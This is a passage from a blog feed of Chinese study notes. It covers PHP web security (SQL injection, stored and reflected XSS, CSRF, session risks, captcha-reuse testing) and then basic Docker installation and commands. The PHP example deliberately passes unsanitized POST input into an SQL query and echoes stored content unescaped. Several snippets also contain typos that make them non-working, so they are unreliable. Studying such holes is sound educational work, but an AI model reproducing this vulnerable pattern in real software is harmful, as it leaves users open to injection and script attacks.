数据库文件包含</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;conn.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;word&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * form Tablename where word_title like &#x27;%<span class="subst">$s</span>%&#x27; &quot;</span></span><br><span class="line"><span class="variable">$list_value</span> = <span class="title function_ invoke__">mysqli_quake</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$list_value</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你搜索的<span class="subst">$s</span>结果如下:&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;ul&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$list</span> <span class="title function_ invoke__">mysqli_fetch_all</span>(<span class="variable">$list_value</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$list</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;用户：<span class="subst">$v</span>[0]&lt;p&gt;内容：<span class="subst">$v</span>[1]&lt;/p&gt;&lt;/li&gt;&quot;</span>; <span class="comment"># 插入点：当提交的文件内容带有js代码块时，每次读取一次数据库内容就执行一次代码。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/ul&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;暂无与<span class="subst">$s</span>相关的搜索结果！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跨站漏洞：你输入的内容控制网站内容的显示<br>应用：留言板<br>XSS跨站脚本攻击</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加载前面的留言内容</span></span><br><span class="line"><span class="comment">// 可以提交留言         =&gt; 插入数据</span></span><br><span class="line"><span class="comment">// 提交留言后会再加载</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 留言存储的地方：存入数据库当中</span></span><br><span class="line"></span><br><span class="line">存储型：脚本存储到数据库或者存储到可以被执行的地方(安全问题出处)</span><br><span class="line">反射型：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 功能性质发现漏洞的方式：寻找能控制页面输出内容的地方(对应的那些功能控件)</span></span><br><span class="line">黑盒安全问题：</span><br><span class="line">接收你的值的输入，又会将你的值输出 =&gt; 对应XSS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">相关PHP函数：<span class="variable">$_SERVER</span></span><br><span class="line">根据目标的功能决定漏洞，</span><br><span class="line">功能越多漏洞越多，功能越少漏洞越少</span><br><span class="line">CSRF请求伪造</span><br><span class="line">来源伪造CSRF</span><br><span class="line">XFF伪造绕过的是PHP检测的，如果是服务器自身的检测不走PHP的，就伪造不了了</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="PHP开发-COOKIE-SESSION-TOKEN"><a href="#PHP开发-COOKIE-SESSION-TOKEN" class="headerlink" title="PHP开发-COOKIE/SESSION/TOKEN"></a>PHP开发-COOKIE/SESSION/TOKEN</h1><h2 id="都是用于身份验证的，但略有区别"><a href="#都是用于身份验证的，但略有区别" class="headerlink" title="都是用于身份验证的，但略有区别"></a>都是用于身份验证的，但略有区别</h2><p>COOKIE：存储到客户端        =&gt; COOKIE被盗取时导致信息泄露/任意条件绕过<br>SESSION：存储到服务器       =&gt; 会话劫持，未失效时才能有效使用(它是动态变换的，有时效性)<br>TOKEN：唯一的身份认证       =&gt; 唯一的标志，利用各种算法来生成这个字符串</p><p>具体实例：SEC-2023版学习-0029</p><h2 id="安全问题-后台验证："><a href="#安全问题-后台验证：" class="headerlink" title="安全问题-后台验证："></a>安全问题-后台验证：</h2><ol><li>用户登录逻辑安全问题     =&gt; SQL注入</li><li>COOKIE和SESSION安全问题</li><li>验证码、万能密码安全问题 =&gt; 防爆破(不规范等于没用，例如被绕过)</li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">验证码存在的问题：</span><br><span class="line">验证码复用，验证码第一次输入后续不再输入</span><br><span class="line"></span><br><span class="line">完整的验证：</span><br><span class="line">每次登陆/刷新页面验证码都要改变</span><br><span class="line"></span><br><span class="line">实战验证：</span><br><span class="line">输入正确的验证码抓包，在重发器测试验证码不改变的情况下掉密码，看验证码是不是会提示错误</span><br><span class="line">提示错误则表示验证码没问题</span><br><span class="line"></span><br><span class="line">验证码识别：</span><br><span class="line">有插件实现，可针对那些非动作类的，一般是薅羊毛的人批量注册搞的</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-PHP开发-03 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker学习-001-概述/安裝</title>
      <link href="/2023/05/02/Docker-Study-001/"/>
      <url>/2023/05/02/Docker-Study-001/</url>
      
        <content type="html"><![CDATA[<p>跟着狂神学Docker！</p><span id="more"></span><h1 id="Docker概述"><a href="#Docker概述" class="headerlink" title="Docker概述"></a>Docker概述</h1><p>开发即运维。(别问我，复杂又费力)</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>Docker：将一个项目带上环境进行统一打包，称为镜像。</p><h3 id="Docker开发与传统开发的区别-amp-核心与本质"><a href="#Docker开发与传统开发的区别-amp-核心与本质" class="headerlink" title="Docker开发与传统开发的区别&amp;核心与本质"></a>Docker开发与传统开发的区别&amp;核心与本质</h3><blockquote><p>传统：开发做jar，运维负责将jar部署上线维护什么的。jar部署的环境什么的都由运维去解决。<br>现在：开发打包部署上线，一条龙服务（高级开发）– 只有一个人负责，没分开发和运维。<br>java – apk – 发布（应用商店） – 张三使用apk — 安装即用<br>java – jar（环境）— 打包项目带上环境 — 发布到Docker仓库（商店）—下载我们发布的镜像–直接运行即可</p></blockquote><p>说白了，Docker能力强大，把开发和运维全干了，合成了一块儿。</p><blockquote><p><strong>Docker核心思想</strong> ：打包装箱，每个箱子之间互相隔离。（隔离机制，能压榨空间）<br><strong>本质</strong> ：所有的技术因为出现了一些问题，我们需要去解决，才去学习。</p></blockquote><h3 id="Docker历史"><a href="#Docker历史" class="headerlink" title="Docker历史"></a>Docker历史</h3><p>2010年，几个搞IT的年轻人，在美国成立了一家公司 DOTCLOUD 提供 PASS云计算服务，LXC有关的容器技术。<br>他们将自己的容器化技术进行统一的简化命名：Docker<br>Docker刚诞生的时候：没引起行业注意，活不下去。==&gt;做起了开源。<br>2013年，Docker开源。越来越多的人发现了Docker的优点，爆火。每个月更新一个版本（社区很活跃）。Docker十分轻巧。<br>2014年，Docker 1.0发布。</p><h4 id="Docker火爆的原因："><a href="#Docker火爆的原因：" class="headerlink" title="Docker火爆的原因："></a>Docker火爆的原因：</h4><p>在容器技术出来之前，我们使用的是虚拟机技术。<br>在VMware等软件虚拟出一台或多台电脑，差不多是一台真实的电脑。非常笨重，不过好处是每个电脑相互隔离。<br>虚拟机也是属于虚拟化技术，Docker也是虚拟化技术，但Docker还是一种容器技术。</p><h4 id="Docker与VM"><a href="#Docker与VM" class="headerlink" title="Docker与VM"></a>Docker与VM</h4><p>VM：Linux Centos 原生镜像，需要开多个虚拟机 几个G，几分钟<br>Docker：隔离，镜像（最核心环境 4M+jdk+mysql）十分小巧，运行镜像就可以了！ 几个M KB 秒级启动！</p><p>到现在，所有的开发人员必须学Docker</p><p>Docker是基于GO语言开发的开源项目。<br>官网：<a href="https://www.docker.com/">https://www.docker.com/</a><br>文档：<a href="https://docs.docker.com/">https://docs.docker.com/</a><br>Dockerhub：<a href="https://www.docker.com/products/docker-hub/">https://www.docker.com/products/docker-hub/</a></p><h4 id="虚拟机技术缺点"><a href="#虚拟机技术缺点" class="headerlink" title="虚拟机技术缺点"></a>虚拟机技术缺点</h4><p>1.资源占用十分多<br>2.冗余步骤多<br>3.启动很慢</p><h4 id="容器技术"><a href="#容器技术" class="headerlink" title="容器技术"></a>容器技术</h4><p>容器化技术不是模拟一个完整的操作系统。<br>比较Docker和虚拟机技术的不同：</p><ul><li>传统虚拟机， 虚拟出一条硬件，运行一个完整的操作系统，然后在这个系统上安装和运行软件。</li><li>容器内的应用直接运行在宿主机的内核当中，没有虚拟化硬件，所以就轻便了。</li><li>每个容器间是互相隔离的，每个容器都有属于自己的容器系统，互不影响。</li></ul><p>开发人员对docker产生的依赖：不想自己装环境（坏处）==&gt; 最好还是学会怎么装环境再使用Docker去封装搬运等。</p><h3 id="DevOps（开发运维）"><a href="#DevOps（开发运维）" class="headerlink" title="DevOps（开发运维）"></a>DevOps（开发运维）</h3><h4 id="应用更快速的交付和部署"><a href="#应用更快速的交付和部署" class="headerlink" title="应用更快速的交付和部署"></a>应用更快速的交付和部署</h4><p>传统：一堆帮助文档，安装程序<br>Docker：打包镜像，发布测试，一键运行</p><h4 id="更便捷的升级和扩缩容"><a href="#更便捷的升级和扩缩容" class="headerlink" title="更便捷的升级和扩缩容"></a>更便捷的升级和扩缩容</h4><p>使用Docker后，部署应用如同搭建积木<br>升级时可以使整体环境进行升级<br>项目横向扩展</p><h4 id="更简单的系统运维"><a href="#更简单的系统运维" class="headerlink" title="更简单的系统运维"></a>更简单的系统运维</h4><p>在容器化之后，我们的开发测试环境是高度一致的。</p><h4 id="更高效的计算机资源利用"><a href="#更高效的计算机资源利用" class="headerlink" title="更高效的计算机资源利用"></a>更高效的计算机资源利用</h4><p>DOcker是内核级的虚拟化，可以在一个物理机上运行很多的容器实例。服务器的性能能被压榨到极致。</p><h1 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h1><h2 id="Docker基本组成"><a href="#Docker基本组成" class="headerlink" title="Docker基本组成"></a>Docker基本组成</h2><p><a href="Docker.png">Docker架构</a></p><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="title">docker</span> build    创建<span class="type">Docker</span></span><br><span class="line"><span class="title">docker</span> pull     拉取<span class="type">Docker</span></span><br><span class="line"><span class="title">docker</span> run      运行<span class="type">Docker</span></span><br></pre></td></tr></table></figure><h2 id="专业术语以及阐释"><a href="#专业术语以及阐释" class="headerlink" title="专业术语以及阐释"></a>专业术语以及阐释</h2><h3 id="镜像：image"><a href="#镜像：image" class="headerlink" title="镜像：image"></a>镜像：image</h3><p>docker镜像好比一个模板，可以通过这个模板来创建容器服务<br>Tomcat镜像 –&gt; run –&gt; Tomcat容器（提供服务器）<br>通过这个镜像可以创建多个容器（最终服务运行或者项目运行就是在容器当中的）。<br>个人理解：这个镜像类似于VM的ISO文件，我们可以通过ISO创建多台虚拟机，也就表示着我们可以通过image创建多个容器。</p><h3 id="容器：container"><a href="#容器：container" class="headerlink" title="容器：container"></a>容器：container</h3><p>Docker利用容器技术，独立运行一个或者一组应用，通过镜像来创建的。<br>基本操作：启动，停止，删除<br>目前理解：一个极简的虚拟机，简易的Linux系统</p><h3 id="仓库：repository"><a href="#仓库：repository" class="headerlink" title="仓库：repository"></a>仓库：repository</h3><p>存放镜像的地方，分为公有仓库和私有仓库。<br>DockerHub（默认是国外的）<br>源默认是国外的，有需要可以配置阿里云加速。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>一点Linux基础，Centos7，Xshell连接。<br>系统内核环境：3.10以上</p><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line">// 查看系统内核是否大于<span class="number">3.1</span></span><br><span class="line">[root@kpl]# unmae -r</span><br></pre></td></tr></table></figure><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p><a href="https://docs.docker.com/engine/install/centos/">官方帮助文档</a></p><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 使用命令清除旧版本docker（卸载）</span></span><br><span class="line">[root@syw]#yum remove docker \</span><br><span class="line">    docker-client \</span><br><span class="line">    docker-client-latest \</span><br><span class="line">    docker-common \</span><br><span class="line">    docker-latest \</span><br><span class="line">    docker-latest-logrotate \</span><br><span class="line">    docker-logrotate \</span><br><span class="line">    docker-engine</span><br><span class="line"><span class="meta"># 安装需要的依赖包 </span></span><br><span class="line"><span class="title">yum</span> install -y yum-utils</span><br><span class="line"><span class="meta"># 设置docker存储库</span></span><br><span class="line"><span class="meta"># 阿里云国内docker镜像仓库配置</span></span><br><span class="line"><span class="title">yum</span>-config-manager <span class="comment">--add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span></span><br><span class="line"><span class="meta"># yum更新索引</span></span><br><span class="line"><span class="title">yum</span> makecache fast</span><br><span class="line"><span class="meta"># 安装最新版docker引擎，docker相关依赖</span></span><br><span class="line"><span class="meta"># docker-ce 社区版，ee为企业版</span></span><br><span class="line"><span class="title">yum</span> install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br><span class="line"><span class="meta"># 启动Docker</span></span><br><span class="line"><span class="title">systemctl</span> start docker</span><br><span class="line"><span class="meta"># 测试是否安装成功</span></span><br><span class="line">[root@localhost ~]# docker version </span><br><span class="line"><span class="type">Client</span>: <span class="type">Docker</span> <span class="type">Engine</span> - <span class="type">Community</span></span><br><span class="line"> <span class="type">Version</span>:           <span class="number">23.0</span>.<span class="number">6</span></span><br><span class="line"> <span class="type">API</span> version:       <span class="number">1.42</span></span><br><span class="line"> <span class="type">Go</span> version:        go1.<span class="number">19.9</span></span><br><span class="line"> <span class="type">Git</span> commit:        ef23cbc</span><br><span class="line"> <span class="type">Built</span>:             <span class="type">Fri</span> <span class="type">May</span>  <span class="number">5</span> <span class="number">21</span>:<span class="number">21</span>:<span class="number">29</span> <span class="number">2023</span></span><br><span class="line"> <span class="type">OS</span>/<span class="type">Arch</span>:           linux/amd64</span><br><span class="line"> <span class="type">Context</span>:           <span class="keyword">default</span></span><br><span class="line"></span><br><span class="line"><span class="type">Server</span>: <span class="type">Docker</span> <span class="type">Engine</span> - <span class="type">Community</span></span><br><span class="line"> <span class="type">Engine</span>:</span><br><span class="line">  <span class="type">Version</span>:          <span class="number">23.0</span>.<span class="number">6</span></span><br><span class="line">  <span class="type">API</span> version:      <span class="number">1.42</span> (minimum version <span class="number">1.12</span>)</span><br><span class="line">  <span class="type">Go</span> version:       go1.<span class="number">19.9</span></span><br><span class="line">  <span class="type">Git</span> commit:       9dbdbd4</span><br><span class="line">  <span class="type">Built</span>:            <span class="type">Fri</span> <span class="type">May</span>  <span class="number">5</span> <span class="number">21</span>:<span class="number">20</span>:<span class="number">38</span> <span class="number">2023</span></span><br><span class="line">  <span class="type">OS</span>/<span class="type">Arch</span>:          linux/amd64</span><br><span class="line">  <span class="type">Experimental</span>:     false</span><br><span class="line"> containerd:</span><br><span class="line">  <span class="type">Version</span>:          <span class="number">1.6</span>.<span class="number">21</span></span><br><span class="line">  <span class="type">GitCommit</span>:        3dce8eb055cbb6872793272b4f20ed16117344f8</span><br><span class="line"> runc:</span><br><span class="line">  <span class="type">Version</span>:          <span class="number">1.1</span>.<span class="number">7</span></span><br><span class="line">  <span class="type">GitCommit</span>:        v1.<span class="number">1.7</span>-<span class="number">0</span>-g860f061</span><br><span class="line"> docker-init:</span><br><span class="line">  <span class="type">Version</span>:          <span class="number">0.19</span>.<span class="number">0</span></span><br><span class="line">  <span class="type">GitCommit</span>:        de40ad0</span><br><span class="line"></span><br><span class="line"><span class="meta"># 获取镜像</span></span><br><span class="line"><span class="title">docker</span> pull hello-world</span><br><span class="line"><span class="meta"># 查看镜像</span></span><br><span class="line"><span class="title">docker</span> images</span><br><span class="line"><span class="meta"># 运行镜像</span></span><br><span class="line"><span class="title">docker</span> run hello-world</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">仅供参考</span><br><span class="line"><span class="meta"># 卸载docker</span></span><br><span class="line"><span class="title">yum</span> remove docker的相关依赖</span><br><span class="line"><span class="meta"># 删除docker运行文件(默认工作路径)</span></span><br><span class="line"><span class="title">rm</span> -rf /var/lib/docker</span><br><span class="line"></span><br><span class="line"><span class="meta"># 镜像加速</span></span><br><span class="line"><span class="meta"># 使用阿里云docker容器镜像服务，找到镜像加速地址，按照阿里云相关资料自己配</span></span><br><span class="line"><span class="meta"># 阿里云内选择：容器镜像服务 &gt; 镜像加速(这是免费的)</span></span><br><span class="line"><span class="meta"># 下方有开发文档，下面是截取出来的内容，顶多链接不一样，其它内容是一样的。</span></span><br><span class="line"><span class="title">sudo</span> mkdir -p /etc/docker</span><br><span class="line"><span class="title">sudo</span> tee /etc/docker/daemon.json &lt;&lt;-&#x27;<span class="type">EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://tjn8a2dr.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">EOF</span></span><br><span class="line"><span class="title">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="title">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure><h2 id="镜像源"><a href="#镜像源" class="headerlink" title="镜像源"></a>镜像源</h2><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line">网易：              http://hub-mirror.c.<span class="number">163</span>.com</span><br><span class="line">中科大镜像地址：      http://mirrors.ustc.edu.cn/</span><br><span class="line">中科大github地址：    https://github.com/ustclug/mirrorrequest</span><br><span class="line"><span class="type">Azure</span>中国镜像地址：   http://mirror.azure.cn/</span><br><span class="line"><span class="type">Azure</span>中国github地址：https://github.com/<span class="type">Azure</span>/container-service-for-azure-china</span><br><span class="line"><span class="type">DockerHub</span>镜像仓库: https://hub.docker.com/ </span><br><span class="line">阿里云镜像仓库：     https://cr.console.aliyun.com </span><br><span class="line"><span class="title">google</span>镜像仓库：    https://console.cloud.google.com/gcr/images/google-containers/<span class="type">GLOBAL</span> （如果你本地可以翻墙的话是可以连上去的 ）</span><br><span class="line"><span class="title">coreos</span>镜像仓库：    https://quay.io/repository/ </span><br><span class="line"><span class="type">RedHat</span>镜像仓库：    https://access.redhat.com/containers</span><br></pre></td></tr></table></figure><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>CS结构守护进程运行在主机上，通过Socket从客户端访问。S接收到客户端C的指令后执行<br>Docker比VM快的原因：</p><blockquote><p>1.Docker抽象层小于虚拟机<br>2.docker调用宿主机内核，VM需要Guest OS</p></blockquote><p>益处：新建容器不二次加载操作系统内核，避免引导性操作。省略了复杂的过程，达到秒级启动。</p><h1 id="Docker基本命令"><a href="#Docker基本命令" class="headerlink" title="Docker基本命令"></a>Docker基本命令</h1><p>帮助命令</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">docker version    <span class="comment"># 显示docker版本信息</span></span><br><span class="line">docker info       <span class="comment"># 显示docker更加详细的信息，系统信息，镜像/容器数量等。</span></span><br><span class="line">docker 命令 --help <span class="comment"># 万能命令</span></span><br><span class="line"></span><br><span class="line">命令相关的帮助文档的地址：https:<span class="comment">//docs.docker.com/reference/</span></span><br></pre></td></tr></table></figure><h2 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h2><h3 id="docker-images-显示信息"><a href="#docker-images-显示信息" class="headerlink" title="docker images 显示信息"></a>docker images 显示信息</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED      SIZE</span><br><span class="line">hello-world   latest    9c7a54a9a43c   9 days ago   13.3kB</span><br><span class="line"><span class="comment"># 参数解析</span></span><br><span class="line">REPOSITORY    镜像的仓库源</span><br><span class="line">TAG           镜像的标签</span><br><span class="line">IMAGE ID      镜像的ID</span><br><span class="line">CREATED       镜像的创建时间</span><br><span class="line">SIZE          镜像的大小</span><br><span class="line"><span class="comment"># 常用参数</span></span><br><span class="line">Options:</span><br><span class="line">  -a, --all             <span class="comment"># 列出所有的镜像</span></span><br><span class="line">  -q, --quiet           <span class="comment"># 只显示镜像的ID</span></span><br></pre></td></tr></table></figure><h3 id="docker-search-搜索镜像"><a href="#docker-search-搜索镜像" class="headerlink" title="docker search 搜索镜像"></a>docker search 搜索镜像</h3><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="title">docker</span> search           # 搜索命令</span><br><span class="line"><span class="title">https</span>://hub.docker.com/ # 在线搜索docker（类似于docker商店）</span><br><span class="line"></span><br><span class="line"><span class="meta"># 可选项，通过收藏来过滤</span></span><br><span class="line"><span class="comment">--fiter-STARS=3000     # 搜索出来的镜像就是STAEAS（收藏量）大于3000的</span></span><br><span class="line">[root@localhost ~]# docker search mysql <span class="comment">--filter=STARS=3000</span></span><br><span class="line"><span class="type">NAME</span>      <span class="type">DESCRIPTION</span>                                      <span class="type">STARS</span>     <span class="type">OFFICIAL</span>   <span class="type">AUTOMATED</span></span><br><span class="line"><span class="title">mysql</span>     <span class="type">MySQL</span> is a widely used, open-source relation…   <span class="number">14124</span>     [<span class="type">OK</span>]       </span><br><span class="line"><span class="title">mariadb</span>   <span class="type">MariaDB</span> <span class="type">Server</span> is a high performing open sou…   <span class="number">5394</span>      [<span class="type">OK</span>]  </span><br></pre></td></tr></table></figure><h3 id="docker-pull下载"><a href="#docker-pull下载" class="headerlink" title="docker pull下载"></a>docker pull下载</h3><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 下载镜像：docker pull 镜像 [:tag(指定版本)]</span></span><br><span class="line"><span class="title">docker</span> pull</span><br><span class="line"></span><br><span class="line">[root@localhost docker]# docker pull mysql</span><br><span class="line"><span class="type">Using</span> <span class="keyword">default</span> tag: latest       # 如果不写tag，默认下载latest（最新版本）</span><br><span class="line"><span class="title">latest</span>: <span class="type">Pulling</span> from library/mysql</span><br><span class="line">72a69066d2fe: <span class="type">Pull</span> complete     # 分层下载，docker images核心 联合文件系统</span><br><span class="line">93619dbc5b36: <span class="type">Pull</span> complete     # 联合文件系统：之前下载过的层，在下载mysql的其它版本时，也能调用这几个层，防止重复下载</span><br><span class="line">99da31dd6142: <span class="type">Pull</span> complete </span><br><span class="line">626033c43d70: <span class="type">Pull</span> complete </span><br><span class="line">37d5d7efb64e: <span class="type">Pull</span> complete </span><br><span class="line"><span class="title">ac563158d721</span>: <span class="type">Pull</span> complete </span><br><span class="line"><span class="title">d2ba16033dad</span>: <span class="type">Pull</span> complete </span><br><span class="line">688ba7d5c01a: <span class="type">Pull</span> complete </span><br><span class="line">00e060b6d11d: <span class="type">Pull</span> complete </span><br><span class="line">1c04857f594f: <span class="type">Pull</span> complete </span><br><span class="line">4d7cfa90e6ea: <span class="type">Pull</span> complete </span><br><span class="line"><span class="title">e0431212d27d</span>: <span class="type">Pull</span> complete </span><br><span class="line"><span class="type">Digest</span>: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709 # 签名信息，防止伪造</span><br><span class="line"><span class="type">Status</span>: <span class="type">Downloaded</span> newer image for mysql:latest</span><br><span class="line"><span class="title">docker</span>.io/library/mysql:latest  # 真实地址</span><br><span class="line"><span class="meta"># docker pull mysql 等价于 dokcer pull .io/library/mysql:latest</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 指定版本下载</span></span><br><span class="line"><span class="meta"># 指定的版本是可以在docker仓库官方那里看到的，不能瞎写</span></span><br><span class="line"><span class="title">docker</span> pull mysql:<span class="number">5.7</span></span><br><span class="line"></span><br><span class="line">[root@localhost docker]# docker pull mysql:<span class="number">5.7</span></span><br><span class="line"><span class="number">5.7</span>: <span class="type">Pulling</span> from library/mysql</span><br><span class="line">72a69066d2fe: <span class="type">Already</span> exists </span><br><span class="line">93619dbc5b36: <span class="type">Already</span> exists </span><br><span class="line">99da31dd6142: <span class="type">Already</span> exists </span><br><span class="line">626033c43d70: <span class="type">Already</span> exists </span><br><span class="line">37d5d7efb64e: <span class="type">Already</span> exists </span><br><span class="line"><span class="title">ac563158d721</span>: <span class="type">Already</span> exists </span><br><span class="line"><span class="title">d2ba16033dad</span>: <span class="type">Already</span> exists </span><br><span class="line">0ceb82207cd7: <span class="type">Pull</span> complete </span><br><span class="line">37f2405cae96: <span class="type">Pull</span> complete </span><br><span class="line"><span class="title">e2482e017e53</span>: <span class="type">Pull</span> complete </span><br><span class="line">70deed891d42: <span class="type">Pull</span> complete </span><br><span class="line"><span class="type">Digest</span>: sha256:f2ad209efe9c67104167fc609cca6973c8422939491c9345270175a300419f94</span><br><span class="line"><span class="type">Status</span>: <span class="type">Downloaded</span> newer image for mysql:<span class="number">5.7</span></span><br><span class="line"><span class="title">docker</span>.io/library/mysql:<span class="number">5.7</span></span><br></pre></td></tr></table></figure><h3 id="docker-rmi-删除镜像"><a href="#docker-rmi-删除镜像" class="headerlink" title="docker rmi 删除镜像"></a>docker rmi 删除镜像</h3><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 删除指定镜像</span></span><br><span class="line"><span class="title">docker</span> rmi [镜像名称或<span class="type">ID</span>]</span><br><span class="line"><span class="title">docker</span> rmi -f 镜像<span class="type">ID</span></span><br><span class="line"><span class="meta"># 删除多个镜像</span></span><br><span class="line"><span class="title">docker</span> rmi 镜像id 镜像id 镜像id ...</span><br><span class="line"><span class="meta"># 删除所有的镜像，且按照ID一个一个递归删除 </span></span><br><span class="line"><span class="title">docker</span> rmi -f $(docker images -aq)</span><br></pre></td></tr></table></figure><h2 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h2><!-- Haskell --><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载容器</span></span><br><span class="line">[root@localhost docker]<span class="comment"># docker pull centos</span></span><br><span class="line"><span class="comment"># 新建容器+启动容器</span></span><br></pre></td></tr></table></figure><h3 id="docker-run命令"><a href="#docker-run命令" class="headerlink" title="docker run命令"></a>docker run命令</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">docker run [可选参数] images</span><br><span class="line"><span class="comment"># 参数说明</span></span><br><span class="line">--name=<span class="string">&quot;Name&quot;</span>  <span class="comment"># 容器命名，用于区分容器</span></span><br><span class="line">-d             <span class="comment"># 后台方式运行</span></span><br><span class="line">-it            <span class="comment"># 使用交互方式运行，进入容器，查看内容</span></span><br><span class="line">-p             <span class="comment"># 指定容器端口</span></span><br><span class="line">  -p ip:主机端口:容器端口</span><br><span class="line">  -p 主机端口:容器端口  (常用的)</span><br><span class="line">  -p  容器端口</span><br><span class="line">  容器端口</span><br><span class="line">-P             <span class="comment"># 随机指定端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line"><span class="comment"># 进入容器，并且打开控制台</span></span><br><span class="line">[root@localhost ~]<span class="comment"># docker run -it centos /bin/bash</span></span><br><span class="line">[root@<span class="number">6</span>be243feda49 /]<span class="comment"># ls # (证明主机名是镜像ID)基础版本，很多命令都是不完善的 </span></span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  <span class="keyword">var</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从容器当中退出主机</span></span><br><span class="line">[root@localhost docker]<span class="comment"># exit </span></span><br><span class="line"><span class="comment"># 查看当前正在运行的容器</span></span><br></pre></td></tr></table></figure><h3 id="docker-ps-查看命令"><a href="#docker-ps-查看命令" class="headerlink" title="docker ps 查看命令"></a>docker ps 查看命令</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 参数：</span></span><br><span class="line">      <span class="comment"># 留空，无参数代表 列出当前正在运行的容器</span></span><br><span class="line">-a    <span class="comment"># 列出当前正在运行的容器+历史运行过的容器</span></span><br><span class="line">-n=?  <span class="comment"># 显示最近创建的容器      使用-n=1,显示最近创建的一个容器</span></span><br><span class="line">-q    <span class="comment"># 只显示容器的编号</span></span><br><span class="line"></span><br><span class="line">[root@localhost docker]<span class="comment"># docker ps</span></span><br><span class="line"><span class="comment"># 查看运行过的容器</span></span><br><span class="line">[root@localhost docker]<span class="comment"># docker ps -a</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span>      <span class="comment"># 直接容器停止并退出 </span></span><br><span class="line">Ctrl+P+Q  <span class="comment"># 容器不停止的退出（要打开大写锁）</span></span><br></pre></td></tr></table></figure><h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 和刚刚的删除差不多</span></span><br><span class="line">docker rm 容器ID                   <span class="comment"># 删指定容器 无法删除正在运行的容器</span></span><br><span class="line">docker rm -f 容器ID                <span class="comment"># 删指定容器 且强制删除容器</span></span><br><span class="line">docker rm -f $(docker iamges -aq) <span class="comment"># 删除所有的容器 </span></span><br><span class="line">docker ps -aq|xargs docker rm     <span class="comment"># 删除所有的容器</span></span><br></pre></td></tr></table></figure><h3 id="启动和停止容器的操作"><a href="#启动和停止容器的操作" class="headerlink" title="启动和停止容器的操作"></a>启动和停止容器的操作</h3><figure class="highlight php"><table><tr><td 